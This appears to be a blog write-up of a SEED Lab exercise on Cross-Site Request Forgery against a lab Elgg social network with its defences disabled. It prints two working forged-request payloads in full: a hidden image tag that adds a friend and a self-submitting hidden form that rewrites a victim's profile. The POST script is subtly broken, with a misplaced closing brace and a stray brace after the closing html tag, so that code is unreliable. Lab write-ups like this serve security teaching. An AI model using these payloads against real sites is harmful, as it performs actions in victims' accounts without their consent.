---
layout: post
title: Cross-Site Request Forgery
excerpt: Cross-Site Request Forgery is a type of attack in which an attacker tricks a user to visit a malicious page that can send a forged request to a targeted website on behalf of the victim. The goal of a CSRF attack can vary, but usually, it involves performing actions on behalf of the targeted user without their consent or knowledge like withdrawing money from their bank account, changing their password, making a purchase, etc.
categories: csrf
---

When a page from a website sends an HTTP request back to the website, it is called same-site request; if the request is sent to a different website, it is called cross-site request.

So suppose Bob is logged into Facebooked and he visits a malicious web page, the malicious webpage can craft a request on behalf of Bob and send it to Facebooked. If Facebooked is non the wiser, Facebooked will think it is Bob who made such request. This is the goal of Cross-Site Request Forgery (CSRF).

Cross-Site Request Forgery is a type of attack in which an attacker tricks a user to visit a malicious page that can send a forged request to a targeted website on behalf of the victim. The goal of a CSRF attack can vary, but usually, it involves performing actions on behalf of the targeted user without their consent or knowledge like withdrawing money from their bank account, changing their password, making a purchase, etc.

Then in the example I gave above, how can Facebooked be wiser? Facebooked developers can implement countermeasures such as CSRF tokens. These tokens are unique values generated by the server and included in forms or requests. The browser must include this token with each request, and the server verifies its validity before processing the action, ensuring that the request actually originates from Facebooked.

In this post, I aim to document my findings and observations while performing a SEED Lab.

<br>

### CSRF Attack using GET Request

In this task, we have two users, Samy and Alice in the Elgg social network and the Elgg social network countermeasures against CSRF has been disabled. Samy wants to become a friend to Alice, but Alice refuses to add him to her Elgg friend list. Samy thus decides to use a CSRF attack to add himself to Alice's friend list.

To accomplish this, Samy sends a URL to Alice; Alice, being curious, clicks on the URL, which leads her to Samy’s web site: `www.attacker32.com`. By just Clicking on that malicious link, the attack has already happened (and is successful so far Alice is logged in). To Alice, she is viewing a beningn web page.

For the purpose of this task, I assume the user, Samy.

- To add a friend to the victim, Samy needs to identify what the legitimate Add-Friend HTTP request looks like. To do this, he can add another user on the Elgg social network while monitoring the requests the browser makes when he does so.

  - The request is `http://www.seed-server.com/action/friends/add?friend=57&__elgg_ts=1691160380,1691160380&__elgg_token=e44ks44KdSrhoXnb4p-Wsg,e44ks44KdSrhoXnb4p-Wsg`
 
    ***image***
 
  - However, since the CSRF countermeasures has been disabled, the request is `http://www.seed-server.com/action/friends/add?friend=57`. Where `57` is the ID of the user.
 
  - Samy nees to find his own ID and substitute the number. The request now becomes `http://www.seed-server.com/action/friends/add?friend=59`

- Next Samy crafts a malicious web page that once Alice visits, The friend request is made on behalf of Alice even without any interaction from Alice.

  - Samy designs a web page and embeds within it an image tag that makes the request.
 
    ```
    <html>
    <body>
    <h1>This page forges an HTTP GET request</h1>
    <img src="http://www.seed-server.com/action/friends/add?friend=59" alt="image" width="1" height="1" />
    </body>
    </html>
    ```

- Next Samy gets Alice to visit the malicious website `www.attacker32.com/addfriend.html`. Alice upon opening the website doesn't realize an attack just took place.

  **image**

If we check Alice friends list, we can see that indeed the attack was successful as Samy is now a friend of Alice.

***image***

<br>

### CSRF Attack using POST Request

In this task, samy is not satisfied that he is now on Alice friends list, he wants Alice profile page to say “Samy is my Hero”, so everybody knows Alice adores him. But Alice does not like Samy, so she will never put that statement in her profile. Samy thus decides to use a CSRF attack to edit Alice's profile to say “Samy is my Hero”.

To accomplish this, Samy sends a URL to Alice; Alice, being curious, clicks on the URL, which leads her to Samy’s web site: `www.attacker32.com`.

For the purpose of this task, I assume the user, Samy.

- To edit the profile page of the victim, Samy needs to identify what the legitimate profile edit HTTP request looks like. To do this, he can edit his own page on the Elgg social network while monitoring the requests the browser makes when he does so.

  - It is a post request made to `http://www.seed-server.com/action/profile/edit`
 
    **image**
 
  - The post request has a number of parameters that are set. However, the parameters that are important for Samy during the attack are: "name", "briefdescription", "accesslevel[briefdescription]", and "guid".
 
    ```
    For this attack, the parameters would be
    name: Alice
    briefdescription: "Samy is my Hero"
    accesslevel[briefdescription]: 2 (this sets the section to be public)
    guid: 56 (this is Alice guid)
    ```

- Next Samy crafts a malicious web page that once Alice visits, a request is made on behalf of Alice to edit her profile page. This webpage would have Javascript code that would be responsible for making the request.

  Samy designs a web page with malicious Javascript code that makes the request.

  ```javascript
  <html>
  <body>
  <h1>This page forges an HTTP POST request.</h1>
  <script type="text/javascript">
  
  function forge_post()
  {
      var fields;
  
      // The following are form entries need to be filled out by attackers.
      // The entries are made hidden, so the victim won't be able to see them.
      fields += "<input type='hidden' name='name' value='Alice'>";
      fields += "<input type='hidden' name='briefdescription' value='Samy is my hero'>";
      fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";         
      fields += "<input type='hidden' name='guid' value='56'>";
  
      // Create a <form> element.
      var p = document.createElement("form");
  
      // Construct the form
      p.action = "http://www.seed-server.com/action/profile/edit";
      p.innerHTML = fields;
      p.method = "post";
  
      // Append the form to the current page.
      document.body.appendChild(p);
  
      // Submit the form
      p.submit();

  // Invoke forge_post() after the page is loaded.
  window.onload = function() { forge_post();}
  </script>
  </body>
  </html>
  }
  ```

- Next Samy gets Alice to visit the malicious website `www.attacker32.com/editprofile.html`. Alice upon opening the website doesn't realize an attack just took place.

  **image**

If we check Alice profile page, we can see that indeed the attack was successful as "Samy is my hero" is on Alice's profile page.

***image***














